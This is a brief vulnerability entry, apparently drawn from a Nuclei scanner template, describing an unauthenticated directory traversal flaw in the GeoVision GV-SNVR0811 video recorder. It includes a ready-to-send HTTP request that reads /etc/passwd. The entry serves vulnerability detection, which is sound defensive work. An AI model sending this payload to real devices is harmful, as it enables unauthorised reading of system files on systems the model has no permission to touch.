# Vulnerability: GeoVision GV-SNVR0811 - Directory Traversal
**Classification:** GEOVISION
**Source:** Nuclei Template (`geovision-lfi.yaml`)

## Description
The GeoVision GV-SNVR0811 network video recorder is vulnerable to a Directory Traversal vulnerability, which allows unauthenticated remote attackers to access arbitrary files on the device by manipulating the file path in HTTP requests (e.g., using ../ sequences).

## Vulnerable Code Pattern / Exploit Payload
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

